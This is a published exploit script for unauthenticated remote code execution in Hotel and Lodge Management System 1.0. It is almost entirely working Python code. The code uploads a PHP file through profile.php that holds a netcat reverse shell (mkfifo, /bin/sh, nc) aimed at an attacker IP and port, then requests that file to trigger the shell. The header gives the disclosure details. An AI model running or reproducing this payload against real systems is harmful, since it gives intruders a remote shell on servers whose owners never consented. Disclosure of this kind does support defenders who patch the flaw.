# Exploit Title: Hotel and Lodge Management System 1.0 - Remote Code Execution (Unauthenticated)
# Date: 07-03-2021
# Exploit Author: Christian Vierschilling
# Vendor Homepage: https://www.sourcecodester.com
# Software Link: https://www.sourcecodester.com/php/13707/hotel-and-lodge-management-system.html
# Version: 1.0
# Tested on: PHP 7.4.14, Linux x64_x86

# --- Description --- #

# The web application allows for an unauthenticated file upload which can result in a Remote Code Execution.
# Executing this script against a target might return a reverse php shell.

# --- Proof of concept --- #

#!/usr/bin/python3
import random
import sys
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

def file_upload(target_ip, attacker_ip, attacker_port):
  print("(+) Setting up reverse shell php file ..")
  random_file_name = str(random.randint(100000, 999999)) + "revshell.php"
  revshell_string = '<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f"); ?>'.format(attacker_ip, attacker_port)
  m = MultipartEncoder(fields={'image': (random_file_name, revshell_string, 'application/x-php'),'btn_update':''})
  print("(+) Trying to upload it ..")
  r1 = requests.post('http://{}/hotel/source code/profile.php'.format(target_ip), data=m, headers={'Content-Type': m.content_type})
  r2 = requests.get('http://{}/hotel/source code/uploadImage/Profile/'.format(target_ip))
  if random_file_name in r2.text:
    print("(+) File upload seems to have been successful!")
    return random_file_name
  else:
    print("(-) Oh noes, file upload failed .. quitting!")
    exit()

def trigger_shell(target_ip, random_file_name):
  print("(+) Now trying to trigger our shell..")
  r3 = requests.get('http://{}/hotel/source code/uploadImage/Profile/{}'.format(target_ip, random_file_name))
  return None

def main():
  if len(sys.argv) != 4:
    print('(+) usage: %s <target ip> <attacker ip> <attacker port>' % sys.argv[0])
    print('(+) eg: %s 10.0.0.1 10.13.37.10 4444' % sys.argv[0])
    sys.exit(-1)

  target_ip = sys.argv[1]
  attacker_ip = sys.argv[2]
  attacker_port = sys.argv[3]

  revshell_file_name = file_upload(target_ip, attacker_ip, attacker_port)
  trigger_shell(target_ip, revshell_file_name)
  print("\n(+) done!")

if __name__ == "__main__":
  main()